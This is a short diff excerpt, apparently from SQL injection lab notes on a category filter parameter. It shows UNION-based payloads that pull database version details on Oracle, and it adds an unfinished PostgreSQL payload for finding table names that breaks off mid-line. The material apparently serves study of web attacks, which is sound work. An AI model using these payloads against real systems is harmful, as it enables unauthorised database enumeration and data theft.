@@ -77,3 +77,7 @@ Ans  : GET /filter?category='
 
        'union SELECT banner,'DEF' FROM v$version  --+   :Oracle 
        'union SELECT version,'DEF' FROM v$instance --+  :Oracle 
+
+     - Find Table Name : Pgsql
+
+      ' union select table_name,'ABC' from 
